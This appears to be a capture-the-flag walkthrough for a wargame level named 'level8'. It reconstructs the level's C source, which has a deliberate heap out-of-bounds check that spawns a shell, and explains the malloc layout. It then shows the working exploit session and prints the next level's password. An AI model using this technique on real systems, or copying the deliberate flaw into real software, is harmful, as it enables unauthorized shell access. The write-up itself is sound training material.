Let's grab instruction of `level8` with GDB and disassemble them.
We should get kind of this code:
``` c
#include <printf.h>
#include <string.h>
#include <stdlib.h>

char *auth = "";
char *service = "";

int main()
{
   char buffer[128];
   while (1)
   {
      printf("%p, %p \n", auth, service);

      if (fgets(buffer, 128, stdin) == NULL)
         return 0;

      if (strncmp(buffer, "auth ", 5) == 0)
      {
         auth = malloc(4);
         if (strlen(buffer + 5) <= 30)
            strcpy(auth, buffer + 5);
      }
      if (strncmp(buffer, "reset", 5) == 0)
      {
         free(auth);
      }
      if (strncmp(buffer, "service", 6) == 0)
      {
         service = strdup(buffer + 7);
      }
      if (strncmp(buffer, "login", 5) == 0)
      {
         if (auth[32] != 0)
            system("/bin/sh");

         fwrite("Password:\n", 1, 10, stdout);
      }
   }

   return 0;
}
```

We see that `auth` variable has length of 4 bytes:
``` c
auth = malloc(4);
```

But then the 32th character is checked:
``` c
if (auth[32] != 0)
   system("/bin/sh");
```

To exploit this we should have superficial knowledge of `malloc` logic.
When two blocks are requested malloc will (usually) place them sequentially like this:
`[header1][payload1][header2][payload2]`

Have this kind of intuition we can assume that `auth[32]` will access next block.
This may be a block for `service` variable!

So, everything we should do is allocate `auth`, then allocate `service` and fill it with big string:
``` shell
$ ./level8 
(nil), (nil) 
auth hello
0x804a008, (nil) 
service djsnckjdsnckjsnckjsndkcnaskdjcnkjsdnckandcjknaksdjcnaksjdnckjadnckjandkcnakdjcnadjc
0x804a008, 0x804a018 
login
$ /home/user/level9/.pass
/bin/sh: 1: /home/user/level9/.pass: Permission denied
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```